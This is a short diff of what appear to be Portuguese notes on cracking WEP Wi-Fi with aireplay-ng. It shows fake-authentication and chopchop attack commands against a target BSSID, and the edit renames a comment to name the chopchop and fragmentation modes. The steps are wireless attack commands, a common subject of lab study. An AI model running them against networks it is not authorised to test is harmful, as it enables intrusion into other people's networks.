@@ -13,7 +13,7 @@ aireplay-ng -1 800000 -a [MAC] [interface] -e [SSID]
 # 3) Manter cliente falso conectado, usar número alto de pacotes.
 
 # 4) Ataque:
-# -4: Tipo do ataque, ver --help
+# -4: Tipo do ataque chopchop. -5: fragment
 aireplay-ng -4 -a [BSSID alvo] -h [MAC fake auth] [interface]
 
 # 5) O comando acima cria um arquivo.xor a ser utilizado para gerar IVs:
